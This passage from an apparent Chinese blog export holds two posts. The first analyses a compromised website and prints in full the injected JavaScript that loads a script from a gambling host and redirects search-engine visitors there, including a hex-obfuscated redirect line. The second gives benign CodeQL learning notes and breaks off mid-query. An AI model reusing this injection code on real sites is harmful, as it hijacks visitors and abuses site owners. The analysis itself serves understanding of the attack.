</code></pre>
<p>辣鸡混淆，就单纯的编了个码，直接在console里跑一下就能快速解码</p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> QDfSn1<span class="token operator">=</span>QDfSn1<span class="token operator">||</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">var</span> BXcvs__L2<span class="token operator">=</span>window<span class="token punctuation">[</span><span class="token string">"document"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'createElement'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"script"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    BXcvs__L2<span class="token punctuation">[</span><span class="token string">'scr'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"//菠菜跳板.com/jquery.1.3.1.js"</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> zqbrN3<span class="token operator">=</span>window<span class="token punctuation">[</span><span class="token string">"document"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'getElementsByTagName'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"script"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    zqbrN3<span class="token punctuation">[</span><span class="token string">"parentNode"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"insertBefore"</span><span class="token punctuation">]</span><span class="token punctuation">(</span>BXcvs__L2<span class="token punctuation">,</span>zqbrN3<span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>往当前页面里添加一个菠菜魔改jQuery，打开看一看</p>
<pre class=" language-javascript"><code class="language-javascript">GID89a<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">//var OPAlt1=new window["\x44\x61\x74\x65"]();var SZ2=OPAlt1['\x67\x65\x74\x53\x65\x63\x6f\x6e\x64\x73']();if(SZ2%5==0){window['\x6c\x6f\x63\x61\x74\x69\x6f\x6e']['\x68\x72\x65\x66']='\x2f\x2f\x62\x6f\x62\x38\x38\x38\x38\x2e\x63\x6e\x2f'};</span>

<span class="token keyword">var</span> _hmt <span class="token operator">=</span> _hmt <span class="token operator">||</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> hm <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"script"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  hm<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">"https://hm.baidu.com/hm.js?7b3656fe95ec73529221927b52290bee"</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> s <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">"script"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
  s<span class="token punctuation">.</span>parentNode<span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span>hm<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> ref<span class="token operator">=</span>document<span class="token punctuation">.</span>referrer<span class="token punctuation">;</span>
<span class="token keyword">var</span> baidu<span class="token operator">=</span>ref<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"baidu"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> soso<span class="token operator">=</span>ref<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"soso"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> google<span class="token operator">=</span>ref<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"google"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> sogou<span class="token operator">=</span>ref<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"sogou"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> sm<span class="token operator">=</span>ref<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"sm.cn"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> so<span class="token operator">=</span>ref<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"so.com"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> sbing<span class="token operator">=</span>ref<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"bing.cn"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span>baidu<span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">||</span> soso<span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">||</span> google<span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">||</span> sogou<span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">||</span> sm<span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">||</span> so<span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">||</span> sbing<span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>

 this_url <span class="token operator">=</span> <span class="token string">'http://菠菜站.cn/m.php'</span><span class="token punctuation">;</span>
  window<span class="token punctuation">.</span>top<span class="token punctuation">.</span>location<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>this_url<span class="token punctuation">)</span><span class="token punctuation">;</span>
  window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span>this_url<span class="token punctuation">;</span>
<span class="token punctuation">}</span> 
  
<span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     
     <span class="token keyword">var</span> bp <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     bp<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">'//push.zhanzhang.baidu.com/push.js'</span><span class="token punctuation">;</span>
     <span class="token keyword">var</span> s <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">"script"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
     s<span class="token punctuation">.</span>parentNode<span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span>bp<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>
      
     <span class="token keyword">var</span> src <span class="token operator">=</span> document<span class="token punctuation">.</span>location<span class="token punctuation">.</span>protocol <span class="token operator">+</span> <span class="token string">'//js.passport.qihucdn.com/11.0.1.js?8113138f123429f4e46184e7146e43d9'</span><span class="token punctuation">;</span>
     document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">'&lt;script src="'</span> <span class="token operator">+</span> src <span class="token operator">+</span> <span class="token string">'" id="sozz">&lt;\/script>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre>
<p>开局一个GID98a，我怀疑是GIF98a打错了。。。还带waf绕过的？菠菜牛逼嗷<br>先一个自调用函数向<a href="https://hm.baidu.com/">https://hm.baidu.com</a> 这个百度的访问统计网站发了一个请求，等于说还统计有多少人被日下来的CCPC导向到菠菜站<br>然后检查了一下referrer，如果是来自这几个搜索引擎就给你跳过去，所以直接访问ccpc是不会被转到菠菜的<br>后面还有一个自调用函数，是让百度的搜索引擎进行一波收录，等于说这个网站被访问一次就进行一次提交，太脏了</p>
<h2 id="学到的奇怪东西"><a href="#学到的奇怪东西" class="headerlink" title="学到的奇怪东西"></a>学到的奇怪东西</h2><p>魔改jQuery中最后那个qihucdn（也是SEO优化类似的接口）没写成功，因为这个魔改jQuery已经是异步加载进来的了，因此此时主文档的渲染就已经结束了，不能再对主文档的Document进行操作，但是insertBefore还能用，有点高级<br>随便找的一个解释<br><a href="https://blog.csdn.net/qq_26291823/article/details/75090069">https://blog.csdn.net/qq_26291823/article/details/75090069</a></p>
<p>抓包的时候并没有发现向这两个网站发送请求。。还以为是他哪里写歪了，研究了两分钟发现，是burp设置中某一项设置，不抓这几个文件扩展名<code>(^gif$|^jpg$|^png$|^css$|^js$|^ico$)</code>，所以.js的请求发是发出去了，就是没抓到<br>实际上是请求了百度的hm和push两个js文件的</p>
<p>还有一点，因为点开就跳转时间太短，又不会在浏览器里面下断点调js，一开始都不知道到底是他的js写歪了还是我抓包的问题，后来老国王提出burp抓包然后把跳转的包拦住慢慢看就行了。。。我太蠢了，再后来发现直接访问域名不就不跳转了吗。。。并且代码也不会变</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>所以说搞这个不是比复习有意思多了，呜呜，为什么我要学信息论和通信原理</p>
]]></content>
      <categories>
        <category>杂项</category>
      </categories>
      <tags>
        <tag>杂项</tag>
      </tags>
  </entry>
  <entry>
    <title>CodeQL坐牢记录</title>
    <url>/CodeQL%E5%9D%90%E7%89%A2%E8%AE%B0%E5%BD%95.html</url>
    <content><![CDATA[<h1 id="CodeQL坐牢记录"><a href="#CodeQL坐牢记录" class="headerlink" title="CodeQL坐牢记录"></a>CodeQL坐牢记录</h1><p>CodeQL，也就是Code query language，高级源码自动化审计语言，大概就是能把代码解析成数据库创建变量之间的联系，进行污点追踪和自动化漏洞挖掘之类的操作。</p>
<p>为什么学是因为在不知道学什么的时候rmb神仙和我说学一下CodeQL吧。然后就踩了一万个坑（然后又突然不是特别闲了导致这个玩意一直没做完）</p>
<p>虽然说codeql也已经出了几年了，相较于一两年前稀碎的文档和少有的资料相比还是好了很多，但实际上遇到问题也基本搜不到什么想要的内容。所以还是在一路狂踩坑。。。</p>
<p><strong>血泪教训：这个玩意一定只适用于已知源码的情况</strong></p>
<p><strong>完成之后的感想，想搞gadget寻找什么的别来这边，这个玩意的功能应该是在有一定思路之后污点追踪之类的，我就当坐了几天牢学习了一下新把戏，以及感觉更适合java以外的语言，总之就是非常坐牢</strong></p>
<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>理论上来说是非常简单的。去GitHub上下一个<a href="https://github.com/github/codeql-cli-binaries">codeql cli</a>的zip，然后解压一下添加PATH就行（想每次敲路径的也可以不加），简单的说就是有手就行.jpg</p>
<p>然后再下一套<a href="https://github.com/github/codeql">依赖库</a>，这个随便塞哪都行，似乎接下来写的ql语句需要和这个东西在一个目录下？</p>
<p>也可以直接下那个<a href="https://github.com/github/vscode-codeql-starter">starter仓库</a>，git clone的时候要递归下载就可以顺便把依赖下下来，也就可以就着在他给的例子文件夹里面写了</p>
<p>依赖里面塞了对应的各个语言的解析工具，不在里面的就不被支持<br>比如世界上最好的垃圾语言PHP没有CodeQL支持。可能是因为太垃圾了吧</p>
<p>然后接下来有两个选择，一个是装一个VS Code然后使用官方插件，一个是直接就着刚才下的zip直接命令行形式启动。就命令行凑合着用吧（其实专门下了个VSCode然后装插件，发现好像也没什么多的好处）</p>
<h2 id="解释型语言数据库创建"><a href="#解释型语言数据库创建" class="headerlink" title="解释型语言数据库创建"></a>解释型语言数据库创建</h2><p>为什么要标明解释型语言呢，因为解释型语言有一个解释器就能跑，而编译型的编译要加一堆buff指定编译流程，需要在创建数据库的时候指定一下command选项进行编译<br>而我的C++和java全部交付与Visual Studio和IDEA，maven估计用的是IDEA自带的，我都不知道我机器上的C++编译器在哪，反正就VS一键编译运行了。。。所以暂且先试一下解释型语言。</p>
<p>这个理论上来说只要把CodeQL装下来就能跑起来（只要你装了解释器）。但由于我的智力条件有限，在这里也被坑了半个下午。。。</p>
<p>网上的教程多少有些抽象。也没有说明什么目录结构之类的，这个starter仓库，里面其实就是塞了两个例子，也没有实际的database。说到底还是要自己建一下</p>
<p>命令为<code>codeql create database &lt;path&gt; --language=&lt;lang&gt; --source-root &lt;path&gt;</code><br>database的path填生成的db的位置，language处填需要分析的语言，source-root里塞想要被分析的文件<br>然后就连解释型型语言的数据库创建我都给踩了坑</p>
<h3 id="autobuild-cmd超级报错"><a href="#autobuild-cmd超级报错" class="headerlink" title="autobuild.cmd超级报错"></a>autobuild.cmd超级报错</h3><p>似乎从来没有人在这里踩过坑，因此这个坑给我整麻了。</p>
<pre><code>A fatal error occurred: Exit status 9009 from command: [D:\codeql\tools\win64\runner.exe, cmd.exe, /C, type, NUL, &amp;&amp;, D:\codeql\python\tools\autobuild.cmd]
</code></pre>
<p>光看这里完全看不懂发生了什么，那个runner.exe肯定是不能看发生了什么的，所以看一下这个autobuild.cmd。</p>
<pre class=" language-cmd"><code class="language-cmd">@echo off

rem Legacy environment variables for the autobuild infrastructure.
set LGTM_SRC=%CD%
set LGTM_WORKSPACE=%CODEQL_EXTRACTOR_PYTHON_SCRATCH_DIR%

type NUL && python "%CODEQL_EXTRACTOR_PYTHON_ROOT%\tools\index.py"
exit /b %ERRORLEVEL%
</code></pre>
<p>简单的来说看不懂，但是我看到最后一句调用了python，但是由于我装了python2和3，为了区别直接叫python2和python3，也就意味着这里没有python这个可执行文件，因此我直接把这里的python改成python3，然后出现了另一个究极报错</p>
<pre><code>[2022-03-15 17:12:02] [build-stdout] Calling py -3 D:\codeql\python\tools\python_tracer.py -v -z all -c D:\projects\VSCodeProjects\CodeQLTest\db\working\trap_cache -p D:\projects\VSCodeProjects\CodeQLTest\db\working\venv\Lib -R D:\projects\VSCodeProjects\CodeQLTest
[2022-03-15 17:12:02] [build-stderr] Installed Pythons found by py Launcher for Windows
[2022-03-15 17:12:02] [build-stdout] Python 3 not found!
[2022-03-15 17:12:02] [build-stderr] No Installed Pythons Found!
[2022-03-15 17:12:02] [build-stderr] Requested Python version (3) not installed, use -0 for available pythons
</code></pre>
<p>简单的说就是找不到python。然后观察一下他调用了一个叫Py的东西，很怪，没听说过，然后百度一下，在Stack Overflow上找到了一个回答。说这个玩意在C:&#x2F;system下面，是通过注册表找python的，去注册表的这个位置找python路径<br><code>\HKEY_CURRENT_USER\SOFTWARE\Python\PythonCore\3.8\InstallPath</code><br>然后我注册表里写的是python.exe，把注册表值改成python3.exe或者把python3.exe复制一份叫python.exe都行</p>
<p>本来说解释型语言不需要配更多环境进行编译，反而这个问题是因为解释型语言不需要指定编译命令导致找不到解释器出现的</p>
<p>接下来就能正常的创建db了</p>
<p>创建db的时候似乎是会把所有的依赖都过一遍，导致创建db的速度很慢，每次查询的时候也不知道干什么要进行一对操作，整个的效率并不是很高（并且vscode+插件会有一个java进程长期占用cpu，导致我的小风扇呼呼的响）</p>
<h2 id="hello-world"><a href="#hello-world" class="headerlink" title="hello world"></a>hello world</h2><p>终于搞起来了。直接把starter仓库里queries python文件夹下面的example.ql改成<code>select &quot;hello world&quot;</code>，然后<code>codeql query run example.ql -d ..\databases\python\db\</code>指定数据库进行查询（这里数据库内容是什么都无所谓了，反正我就只hello world）。也可以装了插件的vscode直接右键run query。然后开始学语法吧</p>
<p>这里有一个奇怪的地方，按照原理上来说，进行ql查询的时候，需要将ql文件写在对应的依赖库目录下。比如python的话就得写在<code>\ql\python\ql\examples</code>目录下，而如果就着他这个starter项目的话，直接写在他的<code>codeql-custom-queries-python</code>下也行。但是另开文件夹写的话就会出现import无效之类的问题。暂且不想理清楚什么情况，就着他的来吧</p>
<p>看rmb神仙的博客里有提到可以在config里设置ql库的位置，不过我windows好像没有这个东西，看codeql插件也没有这个选项，就拉倒了</p>
<blockquote>
<p>在 $HOME&#x2F;.config&#x2F;codeql&#x2F;config 里面设置 ql repo 的路径, 这样才能被 import, 感觉现在这种手动配置好蛋痛 &#x3D;.&#x3D; 感觉跟自己编译 cpp 一样链接一堆库<br>而且文档 u1s1, 挺乱的, 不过刚被 github 收购, 可以理解, 希望之后能更方便一点.<br>–search-path &lt;path to ql repo&gt;<br>注意不要写成 –search-path&#x3D;&lt;path to ql repo&gt;, 不然识别不了… 坑了我好久</p>
</blockquote>
<p>然后就是ql文件同目录中应该得有一个qlpack.yml，类似于pom.xml，就是引入依赖用的，不过我反正没怎么成功，还是就着下下来的例子直接用吧。。</p>
<pre><code>name: codeql/python-examples
groups: 
  - python
  - examples
dependencies:
  codeql/python-all: &quot;*&quot;
</code></pre>
<h2 id="简易语法入门"><a href="#简易语法入门" class="headerlink" title="简易语法入门"></a>简易语法入门</h2><p>这个时候还是启动一下VSCode好了。。。因为插件能展示AST，从AST中边看边学比直接阅读魔幻文档要来的快一点。（理论上来说我写过php parser应该能比较快的理解ast吧。。。因为我的智力条件你也知道.jpg）操作流程应该就是先命令行开一个db，然后在VSCODE里指定那个db文件夹。然后就会多出来一个<code>[db source archive]</code>，内容就是把db文件夹下面的src.zip解包。从这里面选个文件然后从QL插件处点生成AST即可。</p>
<p>然后边看ast边查文档吗。。。太艰难了<br>文档里面把函数叫做<code>Predicates</code>，然后就真的对着文档和AST和例子强行看</p>
<p><a href="https://codeql.github.com/codeql-standard-libraries/">官方文档</a></p>
<p>写了个破烂<br>语法规则就是先from定义变量，where设置条件，select选出结果，然后他也支持一些常用的关键字和函数，比如这里的instanceof，但究竟支持哪些呢。无从知晓，强行看文档和例子吧</p>
<p>这里有一个很怪的点，他只告诉函数的描述和返回值，并没有说清楚具体表现，有一系列名为getAxxx的函数，这个函数的描述就是返回一个xxx，比如Constructor。那么是返回第一个呢，还是每调用一次就返回后面的一个？没说<br>在后面写java的时候，当我想判断某个类是不是有一个无参构造函数时，我就写了大概这样子的一个语句<code>getAConstructor().getNumOfParams()=0</code>，这时判断的到底是哪个构造函数呢？实际用起来感觉像个迭代器一样似乎是把每个构造函数都返回一遍并进行后续判断，那这个时候是用且逻辑还是或逻辑呢？也没说。。。使用起来感觉是或，但文档里似乎一个字也没提，太折磨了</p>
<p>当然，实际上这个功能不应该用上述语句去完成，而应该定义一个Constructor变量c，然后c.getDeclaringType().hasQualifiedName(“javax”)之类的。。。</p>
<p><strong>这个语言的编写思路不是先找到一个大的范围然后再向下搜索，而是应该把小的数据先搜索到再对比他是否属于那个大的目标。比如这里应该是先找到无参的public构造函数，再获取到这个函数所属的类是否属于javax。而不是对javax的类进行遍历，再搜索每个类下是否存在无参public构造函数</strong><br>这个教程文档很好的体现了这一点<br><a href="https://codeql.github.com/docs/codeql-language-guides/analyzing-data-flow-in-java/">analyzing-data-flow-in-java</a></p>
<pre><code>import python
 
from Function f
where f.getStmt(0) instanceof Return
select f.getName()
</code></pre>
<p>功能就是找到所有第一句就是return的函数</p>
<p>以及不同语言下的数据结构并不完全互通，一开始的目的就是用codeql搞java，据说究极log4j就是用这个挖出来的。接下来试着搞一下java。</p>
<h2 id="Java数据库建立和失败的尝试"><a href="#Java数据库建立和失败的尝试" class="headerlink" title="Java数据库建立和失败的尝试"></a>Java数据库建立和失败的尝试</h2><p>首先要配好编译环境。编译Java挺麻烦的，这里选择用mvn搞定。直接用IDEA捆绑的maven即可，找一下路径加入PATH里面即可<br><code>\IDEA 2021.3.2\plugins\maven\lib\maven3\bin\</code></p>
<p>然后开始引入依赖快乐编译，发现编译出来的东西根本不能用。。。<br>可以通过查看db下的src.zip来确认当前数据库包含了多少代码，点开一看发现只携带了我自己写的几个Java文件，一万个引入的依赖都没有被打包进去（python的话import了的东西就自动引入了），然后简单搜索找到了这篇文章<br><a href="https://paper.seebug.org/1324/">使用 CodeQL 分析闭源 Java 程序</a></p>
<blockquote>
<p>CodeQL无法分析已经预先编译好jar包<br>CodeQL无法分析在运行时才被编译的jsp代码</p>
</blockquote>
<p>虽然我知道需要编译，但是jar包也需要重新编译多少有点折磨了。。呜呜，有源码的开源项目还能去GitHub上下源码，没源码的项目可能就得究极反编译jar了。。。然后就顺着这个文章反编译一下jar吧</p>
<p>把idea下的decompiler抽出来<br><code>\IDEA 2021.3.2\plugins\java-decompiler\lib</code><br>然后用<code>java -cp java-decompiler.jar org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler</code>跑起来，然后超级报错</p>
<pre><code>Exception in thread &quot;main&quot; java.lang.UnsupportedClassVersionError: org/jetbrains/java/decompiler/main/decompiler/ConsoleDecompiler has been compiled by a more recent version of the Java Runtime (class file version 55.0), this version of the Java Runtime only recognizes class file versions up to 52.0
</code></pre>
<p>55.0是java11,52.0是java8，等于说我超级新8u311都不给用。<br>幸好我还装了个openjdk的java17，这下总不会有问题了吧</p>
<p>反编译出来之后装模作样整一个maven项目格式的文件夹（就是套上<code>/src/main/java/</code>）把反编译的代码丢进去，然后搓一个pom.xml，进行编译建立数据库<br><code>codeql database create db --language=java --source-root source --command=&quot;mvn compile&quot;</code><br>终于建起来了。。。我是垃圾</p>
<p>想做的操作是复现一下上次java2的找一个javax下的有Object作为成员的类能被fastjson反序列化的类。但是似乎并没有在网上找到javax的源码。。。然后问了下甫舟和我说在lib下的rt.jar中带了全部的javax。再次拉下来进行反编译，写一个pom再编译回去</p>
<p>然后又出现了一些包不存在、反编译时类出错反编译不回来，出现了奇怪的依赖等问题，源码编译不通过就没法用了，计划大失败</p>
<p>如rmb神仙所言，这个是用来审计源代码的，而不是字节码，在没有源码的情况下，不如使用一个叫做<code>gadgetinspator</code>的工具（没听说过，我为什么什么都不会），不要强行折磨自己进行坐牢。。。并且这个的主要作用也是污点追踪之类的操作，而不是我这种找某个符合条件的类<br>（说起来好像这种东西直接反射找会跟来得快。。。）<br>我直接知难而退，使用GitHub上的例子来进行学习</p>
<h2 id="analyzing-data-flow-in-java"><a href="#analyzing-data-flow-in-java" class="headerlink" title="analyzing-data-flow-in-java"></a>analyzing-data-flow-in-java</h2><p><a href="https://codeql.github.com/docs/codeql-language-guides/analyzing-data-flow-in-java/">analyzing-data-flow-in-java</a><br>不得不说，这个教程带题目和答案还挺良心的，比那个抽象的要死的官方文档好一万倍</p>
<h3 id="练习1"><a href="#练习1" class="headerlink" title="练习1"></a>练习1</h3><p>要求是找出以硬编码形式构造的java.net.URL类<br>使用局部数据追踪，就是追踪一个函数内的意思吧？<br>先上答案</p>
<pre class=" language-sql"><code class="language-sql"><span class="token keyword">import</span> java
<span class="token keyword">import</span> semmle<span class="token punctuation">.</span>code<span class="token punctuation">.</span>java<span class="token punctuation">.</span>dataflow<span class="token punctuation">.</span>DataFlow
<span class="token keyword">import</span> semmle<span class="token punctuation">.</span>code<span class="token punctuation">.</span>java<span class="token punctuation">.</span>dataflow<span class="token punctuation">.</span>TaintTracking

<span class="token keyword">from</span> Constructor netURL<span class="token punctuation">,</span> <span class="token keyword">Call</span> <span class="token keyword">call</span><span class="token punctuation">,</span> StringLiteral str
<span class="token keyword">where</span> netURL<span class="token punctuation">.</span>getDeclaringType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"java.net"</span><span class="token punctuation">,</span> <span class="token string">"URL"</span><span class="token punctuation">)</span> <span class="token operator">and</span>
    <span class="token keyword">call</span><span class="token punctuation">.</span>getCallee<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> netURL <span class="token operator">and</span>
    DataFlow::localFlow<span class="token punctuation">(</span>DataFlow::exprNode<span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">,</span> DataFlow::exprNode<span class="token punctuation">(</span><span class="token keyword">call</span><span class="token punctuation">.</span>getArgument<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">select</span> str
</code></pre>
<p>hasQualifiedName这个函数好像只能找完全限定名，所以说之前想找javax下的类可能得用indexof之类的操作了。<br>然后函数调用和函数定义是不一样的，因此需要分别定义Constructor作为定义，Call作为调用进行判断。<br>然后一个demo用于测试</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>URL<span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name">Demo</span><span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>
        String a <span class="token operator">=</span> <span class="token string">"http"</span><span class="token punctuation">;</span>
        String b <span class="token operator">=</span> <span class="token string">"www.z3ratu1.cn"</span><span class="token punctuation">;</span>
        String c <span class="token operator">=</span> <span class="token string">"blog.z3ratu1.cn"</span><span class="token punctuation">;</span>
        String d <span class="token operator">=</span> a<span class="token operator">+</span>b<span class="token punctuation">;</span>
        String e <span class="token operator">=</span> b<span class="token punctuation">;</span>
        String f <span class="token operator">=</span> b<span class="token operator">+</span><span class="token string">":8080"</span><span class="token punctuation">;</span>
        URL url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
        URL url2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">;</span>
        URL url3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
        URL url4 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>（new URL的时候可能抛出一个exception，vscode一开始没提示我编译还没过。。。）<br>数据跟踪有两种形式，一种是Dataflow，一种是TaintTracking<br>前者就是数据流，后者是污点追踪。DataFlow::localFlow方法可以将指定的两个节点作为数据流关联起来，其是DataFlow::localFlowStep的递归版本。TaintTracking继承自Dataflow，其localTaint方法能进行污点追踪。就是DataFlow只认为<code>var b=a</code>这种直接等于的赋值纳入范围，而TaintTracking则会将<code>var c =a+b</code>也同样纳入追踪，同样也有localTaintStep，仅追踪单步</p>
<p>简单测试一下四个方法的查询结果（这个玩意跑的真的慢，就这么个文件查一次也要十几秒，建立数据库感觉也得个半分钟）</p>
<table>
<thead>
<tr>
<th>函数</th>
<th>对应字符串所在的变量</th>
</tr>
</thead>
<tbody><tr>
<td>localFlow</td>
<td>b c</td>
</tr>
<tr>
<td>localFlowStep</td>
<td>c</td>
</tr>
<tr>
<td>localTaint</td>
<td>a b c “:8080”</td>
</tr>
<tr>
<td>localTaintStep</td>
<td>c</td>
</tr>
</tbody></table>
<p>从这个结果上来说就大致能理解这两个数据追踪方法的原理了，所以基本上都是用污点追踪嗷</p>
<h3 id="练习2"><a href="#练习2" class="headerlink" title="练习2"></a>练习2</h3><blockquote>
<p>Write a query that finds all hard-coded strings used to create a java.net.URL, using global data flow</p>
</blockquote>
<p>使用全局数据追踪模块追踪java.net.URL中使用的硬编码字符串，重写他的类来实现，我看大部分的人也都是用的这个进行污点追踪<br>先看答案再反向分析</p>
<pre class=" language-sql"><code class="language-sql"><span class="token keyword">import</span> semmle<span class="token punctuation">.</span>code<span class="token punctuation">.</span>java<span class="token punctuation">.</span>dataflow<span class="token punctuation">.</span>DataFlow

class Configuration extends DataFlow::Configuration {
  Configuration<span class="token punctuation">(</span><span class="token punctuation">)</span> {
    this <span class="token operator">=</span> <span class="token string">"LiteralToURL Configuration"</span>
  }

  override predicate isSource<span class="token punctuation">(</span>DataFlow::Node source<span class="token punctuation">)</span> {
    source<span class="token punctuation">.</span>asExpr<span class="token punctuation">(</span><span class="token punctuation">)</span> instanceof StringLiteral
  }

  override predicate isSink<span class="token punctuation">(</span>DataFlow::Node sink<span class="token punctuation">)</span> {
    <span class="token keyword">exists</span><span class="token punctuation">(</span><span class="token keyword">Call</span> <span class="token keyword">call</span> <span class="token operator">|</span>
      sink<span class="token punctuation">.</span>asExpr<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token keyword">call</span><span class="token punctuation">.</span>getArgument<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">and</span>
